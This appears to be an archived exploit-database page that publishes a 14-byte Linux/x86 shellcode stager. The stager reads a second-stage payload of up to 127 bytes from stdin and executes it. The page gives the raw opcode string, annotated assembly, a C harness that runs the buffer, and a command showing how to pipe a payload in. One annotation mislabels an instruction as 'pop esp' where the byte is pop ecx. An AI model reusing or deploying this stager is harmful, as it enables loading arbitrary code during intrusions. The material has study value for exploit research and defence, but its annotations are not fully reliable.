<html><head><title>Linux/x86 - stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes
 * _fkz / twitter: @_fkz 
 *
 * sc = &quot;\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3&quot;
 * 
 * Example of use:
 * (echo -ne &quot;\xseconde stage shellcode\x&quot;; cat) | ./stager
 */
 
 char shellcode[] = 
 
 		&quot;\x6A\x7F&quot;		//	push	byte	+0x7F
 		&quot;\x5A&quot;			//	pop		edx	
 		&quot;\x54&quot;			//	push	esp
 		&quot;\x59&quot;			//	pop		esp
 		&quot;\x31\xDB&quot;		//	xor		ebx,ebx
 		&quot;\x6A\x03&quot;		//	push	byte	+0x3
 		&quot;\x58&quot;			//	pop		eax
 		&quot;\xCD\x80&quot;		//	int		0x80
 		&quot;\x51&quot;			//	push	ecx
 		&quot;\xC3&quot;;			//	ret

int main(int argc, char *argv[])
{
	void (*execsh)() = (void *)&amp;shellcode;
	execsh();
	return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
